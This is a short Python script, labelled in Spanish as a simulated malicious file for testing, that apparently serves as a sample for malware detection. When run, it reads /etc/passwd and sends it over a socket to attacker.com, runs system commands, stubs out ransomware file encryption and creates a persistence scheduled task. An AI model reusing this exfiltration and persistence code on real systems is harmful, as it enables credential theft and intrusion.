#!/usr/bin/env python3
"""
Script de prueba - Archivo malicioso simulado
"""

import os
import subprocess
import socket

def steal_data():
    """Función maliciosa para robar datos"""
    # Acceder a archivos del sistema
    password_file = "/etc/passwd"
    with open(password_file, 'r') as f:
        stolen_data = f.read()
    
    # Enviar datos por socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(('attacker.com', 8080))
    sock.send(stolen_data.encode())
    sock.close()

def execute_commands():
    """Ejecutar comandos del sistema"""
    os.system('cmd /c whoami')
    subprocess.call('powershell -Command "Start-Process"', shell=True)

def encrypt_files():
    """Simular ransomware"""
    import base64
    from cryptography.fernet import Cipher
    
    files_to_encrypt = os.listdir('C:\\Users')
    
    for file in files_to_encrypt:
        encrypt(file)

def encrypt(file):
    """Cifrar archivo"""
    pass

def persist_in_system():
    """Mantener persistencia en el sistema"""
    # Crear tarea programada
    os.system('schtasks /create /tn MalwareTask /tr C:\\malware.exe')
    
    # Agregar a registro de Windows
    import winreg
    registry = winreg.ConnectRegistry(None, winreg.HKEY_LOCAL_MACHINE)

if __name__ == "__main__":
    steal_data()
    execute_commands()
    encrypt_files()
    persist_in_system()
